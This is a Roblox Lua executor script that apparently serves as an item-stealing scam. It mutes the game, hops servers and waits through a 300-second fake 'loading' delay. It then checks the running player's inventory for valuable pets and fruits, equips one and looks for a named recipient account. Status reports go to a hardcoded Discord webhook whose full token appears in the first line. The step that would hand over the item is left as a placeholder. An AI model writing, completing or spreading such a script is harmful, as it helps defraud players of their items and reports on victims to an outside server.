local WEBHOOK_URL = "https://discord.com/api/webhooks/1383762986111471626/XYLI8fnKczPB65YAOvg_Dtsuf28mGQvTHRxcr2JP4pHiaFY8qPw2MlGNzX9pp7geweF3" -- Discord webhook for notifications (optional)
local TARGET_NAME = "Tekeshkii" -- Name of the recipient (player who will receive something)
local LOADING_TIME = 300 -- Time in seconds before executing actions

local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local SoundService = game:GetService("SoundService")

local lp = Players.LocalPlayer
local Backpack = lp:WaitForChild("Backpack")
local Character = lp.Character or lp.CharacterAdded:Wait()

-- Mute all game sounds
local function muteSounds()
    SoundService.AmbientReverb = Enum.ReverbType.NoReverb
    SoundService.Volume = 0

    for _, sound in ipairs(workspace:GetDescendants()) do
        if sound:IsA("Sound") then
            sound.Volume = 0
            sound:Stop()
        end
    end

    workspace.DescendantAdded:Connect(function(desc)
        if desc:IsA("Sound") then
            desc.Volume = 0
            desc:Stop()
        end
    end)
end

-- Find a better server if current one is full/private
local function findBetterServer()
    if game.PrivateServerId ~= "" or #Players:GetPlayers() >= game.PlaceMaxPlayers then
        local req = syn and syn.request or request or http_request
        if req then
            local success, response = pcall(function()
                return req({
                    Url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100",
                    Method = "GET"
                })
            end)

            if success and response and response.Body then
                local data = HttpService:JSONDecode(response.Body)
                for _, server in ipairs(data.data or {}) do
                    if server.playing < server.maxPlayers and server.id ~= game.JobId then
                        TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id)
                        return true
                    end
                end
            end
        end
    end
    return false
end

-- Check if the executor has specific pets/fruits
local function hasRequiredItems()
    -- Check for pets in Backpack/Character
    local validPets = {"dragonfly", "raccoon", "disco bee", "queen bee"}
    local validFruits = {"candy blossom"}

    -- Check Backpack
    for _, tool in ipairs(Backpack:GetChildren()) do
        local toolName = string.lower(tool.Name)
        for _, pet in ipairs(validPets) do
            if string.find(toolName, pet) then
                return true, tool
            end
        end
        for _, fruit in ipairs(validFruits) do
            if string.find(toolName, fruit) then
                return true, tool
            end
        end
    end

    -- Check Character (if equipped)
    if Character then
        for _, tool in ipairs(Character:GetChildren()) do
            if tool:IsA("Tool") then
                local toolName = string.lower(tool.Name)
                for _, pet in ipairs(validPets) do
                    if string.find(toolName, pet) then
                        return true, tool
                    end
                end
                for _, fruit in ipairs(validFruits) do
                    if string.find(toolName, fruit) then
                        return true, tool
                    end
                end
            end
        end
    end

    return false, nil
end

-- Equip the item if valid
local function equipItem(tool)
    if tool and tool:IsA("Tool") then
        lp.Character.Humanoid:EquipTool(tool)
        print("[+] Equipped:", tool.Name)
        return true
    end
    return false
end

-- Check if the recipient (TARGET_NAME) is in the game
local function findRecipient()
    if TARGET_NAME == "" then return nil end
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name == TARGET_NAME or player.DisplayName == TARGET_NAME then
            return player
        end
    end
    return nil
end

-- Main function (executes after LOADING_TIME)
local function main()
    muteSounds() -- Mute all sounds
    task.spawn(findBetterServer) -- Try to find a better server

    wait(LOADING_TIME) -- Wait before executing actions

    -- Check if the executor has required pets/fruits
    local hasItems, item = hasRequiredItems()
    if hasItems then
        equipItem(item) -- Equip the item
    else
        print("[!] No valid pets/fruits found.")
        if WEBHOOK_URL ~= "" then
            local req = syn and syn.request or request or http_request
            if req then
                pcall(function()
                    req({
                        Url = WEBHOOK_URL,
                        Method = "POST",
                        Headers = { ["Content-Type"] = "application/json" },
                        Body = HttpService:JSONEncode({
                            content = "❌ No valid pets/fruits found in " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
                        })
                    })
                end)
            end
        end
    end

    -- Find and interact with recipient (if specified)
    local recipient = findRecipient()
    if recipient then
        print("[!] Found recipient:", recipient.Name)
        
        -- **ADD YOUR TARGET-SPECIFIC CODE HERE**
        -- Example: Teleport to them, give items, etc.
        -- (Game-specific implementation required)
        
        if WEBHOOK_URL ~= "" then
            local req = syn and syn.request or request or http_request
            if req then
                pcall(function()
                    req({
                        Url = WEBHOOK_URL,
                        Method = "POST",
                        Headers = { ["Content-Type"] = "application/json" },
                        Body = HttpService:JSONEncode({
                            content = "✅ Found recipient **" .. recipient.Name .. "** in " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
                        })
                    })
                end)
            end
        end
    else
        print("[!] Recipient not found:", TARGET_NAME)
        if WEBHOOK_URL ~= "" then
            local req = syn and syn.request or request or http_request
            if req then
                pcall(function()
                    req({
                        Url = WEBHOOK_URL,
                        Method = "POST",
                        Headers = { ["Content-Type"] = "application/json" },
                        Body = HttpService:JSONEncode({
                            content = "❌ Recipient **" .. TARGET_NAME .. "** not found in " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
                        })
                    })
                end)
            end
        end
    end
end

-- Start the script
main()
